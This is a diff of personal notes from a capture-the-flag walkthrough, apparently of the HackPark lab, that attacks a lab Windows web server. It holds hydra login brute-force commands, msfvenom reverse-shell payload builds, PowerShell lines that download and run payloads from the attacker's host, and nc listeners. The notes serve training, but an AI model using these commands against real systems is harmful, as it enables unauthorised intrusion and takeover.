@@ -12,10 +12,13 @@ Run the following command but fill in the blanks:
 hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
 
 Guess a username, choose a password wordlist and gain credentials to a user account!
-hint:
+hint: with user is admin
 hydra =l admin -P /usr/share/wordlist/rockyou.txt 10.10.122.194 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=agBZe1QXs4%2B%2FL1h54wHSuo%2BpohPXSZregIOlQxiIubDgI6C8V09zZsSSbDJVlT1K4g1PwVBCzxe8H1Qs8S%2FsYDmU%2FP7c3apNdwC9ljxfRfc%2FjAK4bYsIDsTOXjLNnXTBUfeoAeIE3YnUOY8GNGOSSiUmVeWhwMOcv01K7%2FcMAzfoGOhFeCkOcc1DfBw9YaudFfZ81RhbODohJN%2BaJBIuiJ73eHKhkODnxE0%2FAQgj5VkPDfu9kKO5hOkpCeOYyYPp9l0CKkjq7TLsOGRMyEQKthUF15XfaRKIpIPXoXse5PZcIRXnA66MtxfikB%2FIo2zQdU8nSsDbISATNBYAhpsF4du5ns3wVnQj%2Bc1Oyg1YVxkQR8g0&__EVENTVALIDATION=TKcz7GY2MkSuv7S4OQ6tXKQeBL160wPT1hW6Bn0GswzHa4AtBbS1Jmc5jjT90ohl46foZXLbhCVa0HF2WSB5BX4fhbEFrmYzDIqR7M3QfyCK5T2RlcT7n0buiUNiTqvSBhYciAr0%2FBIaWOz%2FfL8Lrn0VRju%2F2yI8fiVIJjg2mdliDuPr&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 
-with "__VIEWSTATE=agBZe1QXs4%2B%2FL1h54wHSuo%2BpohPXSZregIOlQxiIubDgI6C8V09zZsSSbDJVlT1K4g1PwVBCzxe8H1Qs8S%2FsYDmU%2FP7c3apNdwC9ljxfRfc%2FjAK4bYsIDsTOXjLNnXTBUfeoAeIE3YnUOY8GNGOSSiUmVeWhwMOcv01K7%2FcMAzfoGOhFeCkOcc1DfBw9YaudFfZ81RhbODohJN%2BaJBIuiJ73eHKhkODnxE0%2FAQgj5VkPDfu9kKO5hOkpCeOYyYPp9l0CKkjq7TLsOGRMyEQKthUF15XfaRKIpIPXoXse5PZcIRXnA66MtxfikB%2FIo2zQdU8nSsDbISATNBYAhpsF4du5ns3wVnQj%2Bc1Oyg1YVxkQR8g0&__EVENTVALIDATION=TKcz7GY2MkSuv7S4OQ6tXKQeBL160wPT1hW6Bn0GswzHa4AtBbS1Jmc5jjT90ohl46foZXLbhCVa0HF2WSB5BX4fhbEFrmYzDIqR7M3QfyCK5T2RlcT7n0buiUNiTqvSBhYciAr0%2FBIaWOz%2FfL8Lrn0VRju%2F2yI8fiVIJjg2mdliDuPr&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+with user unknow
+hydra -l /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 10.10.223.151 http-post-form "/Account/login.aspx:__VIEWSTATE=zxsU0RWZYScuCsgRMhLgSTr1PoayBeaV4lo5sLvm0fw8bdR4DAFw3BETvwwLRiZSRt%2F1w8c%2FM4OErjLQD1aNmDvJLX7SEWN6oP53gD8G7zMKPzW2HP9YDyTrYuL1%2B%2B%2FhZWE0INdeXestYbm7SpAiASWlxax0k9p%2FcjwQRgf3w262DCer&__EVENTVALIDATION=2skLbzLcjJuAyEJqYltwe3UCQg0l0cdpbW3YrZ3pIucNNqvhkDXmo21QLps5KCvfvJzI8AsL7VY8HB0IROpQP63OyBTGE%2BfjX5JfZtqne2rZtxKTKyTauNpwVTexMIr9UC1beuX6ka3CDnnVDq7M7%2FZpKaomsps6y6Mkux4s3J%2BwE7dr&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+
+with Request "__VIEWSTATE=agBZe1QXs4%2B%2FL1h54wHSuo%2BpohPXSZregIOlQxiIubDgI6C8V09zZsSSbDJVlT1K4g1PwVBCzxe8H1Qs8S%2FsYDmU%2FP7c3apNdwC9ljxfRfc%2FjAK4bYsIDsTOXjLNnXTBUfeoAeIE3YnUOY8GNGOSSiUmVeWhwMOcv01K7%2FcMAzfoGOhFeCkOcc1DfBw9YaudFfZ81RhbODohJN%2BaJBIuiJ73eHKhkODnxE0%2FAQgj5VkPDfu9kKO5hOkpCeOYyYPp9l0CKkjq7TLsOGRMyEQKthUF15XfaRKIpIPXoXse5PZcIRXnA66MtxfikB%2FIo2zQdU8nSsDbISATNBYAhpsF4du5ns3wVnQj%2Bc1Oyg1YVxkQR8g0&__EVENTVALIDATION=TKcz7GY2MkSuv7S4OQ6tXKQeBL160wPT1hW6Bn0GswzHa4AtBbS1Jmc5jjT90ohl46foZXLbhCVa0HF2WSB5BX4fhbEFrmYzDIqR7M3QfyCK5T2RlcT7n0buiUNiTqvSBhYciAr0%2FBIaWOz%2FfL8Lrn0VRju%2F2yI8fiVIJjg2mdliDuPr&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 is raw on request when F12->network
 
 1qaz2wsx
@@ -69,7 +72,11 @@ iis apppool\blog
 Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.88.227 lport=2345 -f exe
  -o revshell.exe
+ 
 on target machine c:\windows\system32\inetsrv>powershell -c "Invoke-WebRequest -Uri 'http://10.6.88.227:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+
+or powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.88.227:8000/revshell.exe','revshell.exe')"
+
 c:\Windows\Temp>revshell.exe
 
 on my machine
@@ -138,6 +145,41 @@ hint: meterpreter>cd "c:\Users\Administrator\Desktop\"
 cat root.txt
 7e13d97f05f7ceb9881a3eb3d78d3e72
 
+#Task 5  Privilege Escalation Without Metasploit
+- Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.88.227 LPORT=4433 -e x86/shikata_ga_nai -f exe -o reverse.exe
+
+
+After generating our payload we need to pull this onto the box using powershell.
+Tip: It's common to find C:\Windows\Temp is world writable!
+
+on target machine: meterpreter>shell
+
+exit
+mv reverse.exe Message.exe
+
+on my machine: nc -lnvp 4433
+
+- Using winPeas, what was the Original Install time? (This is date and time)
+
+C:\PROGRA~2\SYSTEM~1>systeminfo
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA886
+Original Install Date:     8/3/2019, 10:43:23 AM
+System Boot Time:          7/27/2021, 8:07:48 AM
+.....
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.6.88.227:8000/WinPEASx64.exe' -OutFile 'c:\Windows\temp\WinPEASx64.exe'"
+.\WinPEASx64.exe
+
+8/3/2019, 10:43:23 AM
 
 
 
